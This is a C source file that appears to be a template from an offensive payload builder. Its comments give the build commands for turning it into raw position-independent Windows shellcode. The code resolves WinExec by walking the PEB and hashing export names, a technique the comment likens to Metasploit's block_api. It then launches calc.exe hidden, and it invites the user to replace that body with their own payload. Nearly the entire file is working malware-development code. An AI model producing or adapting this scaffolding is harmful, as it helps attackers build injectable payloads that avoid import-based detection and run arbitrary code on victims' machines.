// templates/pic_template.c
//
// Position-independent C shellcode template for `--format pic_c`.
//
// Build (performed by the builder):
//   x86_64-w64-mingw32-gcc -Os -fno-builtin -fno-ident \
//       -fno-asynchronous-unwind-tables -fno-stack-protector \
//       -fomit-frame-pointer -nostdlib -Wl,-e,go -Wl,--build-id=none \
//       pic_template.c -o pic.exe
//   x86_64-w64-mingw32-objcopy -O binary --only-section=.text pic.exe pic.bin
//
// ENTRY CONVENTION (documented contract):
//   - The entry symbol is `go`. It MUST be the only non-inlined function
//     emitted first in .text; the builder links with -Wl,-e,go and extracts
//     .text, so execution begins at `go` with no arguments.
//   - `go` is called as a raw shellcode entry: no CRT, no argc/argv, no
//     initialized globals. Return with `ret` (or never return).
//
// PIC RULES (same discipline as tools/pe_stub.c):
//   - No globals, no string literals, no static data: .text must stand
//     alone. Build strings on the stack byte-by-byte.
//   - Resolve Win32 APIs by PEB walk + ROR13 hashing (helpers below);
//     never link against import libraries.
//   - No CRT calls (no printf/memcpy/malloc); write your own loops.
//   - Keep every helper `static inline __attribute__((always_inline))` so
//     `go` remains the only out-of-line function (offset 0 of .text).
//
// This template resolves kernel32!WinExec by hash and launches calc.exe.
// Replace the body of go() with your payload.

typedef unsigned char       u8;
typedef unsigned short      u16;
typedef unsigned int        u32;
typedef unsigned long long  u64;
typedef unsigned short      wchar;

// ── ROR13 API hashing (same algorithm as sRDI / metasploit block_api) ──

static inline __attribute__((always_inline)) u32 hash_str(const char *s) {
    u32 h = 0;
    while (*s) {
        h = (h >> 13) | (h << 19);
        h += (u8)*s;
        s++;
    }
    return h;
}

static inline __attribute__((always_inline)) u32 hash_w(const wchar *s) {
    u32 h = 0;
    while (*s) {
        wchar c = *s;
        if (c >= 'A' && c <= 'Z') c += 32;
        h = (h >> 13) | (h << 19);
        h += (u8)c;
        s++;
    }
    return h;
}

// Compute with the same algorithm: hash_w(L"kernel32.dll"),
// hash_str("WinExec"). See tools/pe_stub.c for the full list.
#define H_KERNEL32   0x8fecd63f
#define H_WINEXEC    0x0e8afe98

static inline __attribute__((always_inline)) u16 rd16(u8 *p) {
    return (u16)(p[0] | (p[1] << 8));
}
static inline __attribute__((always_inline)) u32 rd32(u8 *p) {
    return (u32)p[0] | ((u32)p[1] << 8) | ((u32)p[2] << 16) | ((u32)p[3] << 24);
}

static inline __attribute__((always_inline)) u8 *read_peb(void) {
    u8 *peb;
    __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
    return peb;
}

static inline __attribute__((always_inline)) u8 *find_module(u32 want) {
    u8 *peb = read_peb();
    u8 *ldr = *(u8 **)(peb + 0x18);
    u8 *head = ldr + 0x20;
    u8 *link = *(u8 **)(ldr + 0x20);
    while (link != head) {
        u8 *entry = link - 0x10;
        u8 *dll_base = *(u8 **)(entry + 0x30);
        wchar *name = *(wchar **)(entry + 0x60);
        if (name && hash_w(name) == want)
            return dll_base;
        link = *(u8 **)link;
    }
    return 0;
}

static inline __attribute__((always_inline)) u8 *get_export(u8 *base, u32 want) {
    u32 pe_off = rd32(base + 0x3C);
    u8 *opt = base + pe_off + 4 + 20;
    u32 exp_rva = rd32(opt + 112);
    if (!exp_rva) return 0;
    u8 *exp = base + exp_rva;
    u32 n_names = rd32(exp + 24);
    u8 *names = base + rd32(exp + 32);
    u8 *ords  = base + rd32(exp + 36);
    u8 *funcs = base + rd32(exp + 28);
    for (u32 i = 0; i < n_names; i++) {
        char *nm = (char *)(base + rd32(names + i * 4));
        if (hash_str(nm) == want) {
            u16 o = rd16(ords + i * 2);
            return base + rd32(funcs + (u32)o * 4);
        }
    }
    return 0;
}

typedef u32 (*fn_WinExec)(const char *, u32);

// ── Shellcode entry (MUST stay the only out-of-line function) ─────────

void go(void) {
    u8 *k32 = find_module(H_KERNEL32);
    if (!k32) return;
    fn_WinExec pWinExec = (fn_WinExec)get_export(k32, H_WINEXEC);
    if (!pWinExec) return;

    // "calc" built on the stack - a string literal would land in .rdata
    // and break position independence.
    char cmd[5];
    cmd[0] = 'c'; cmd[1] = 'a'; cmd[2] = 'l'; cmd[3] = 'c'; cmd[4] = 0;
    pWinExec(cmd, 0 /* SW_HIDE */);
}
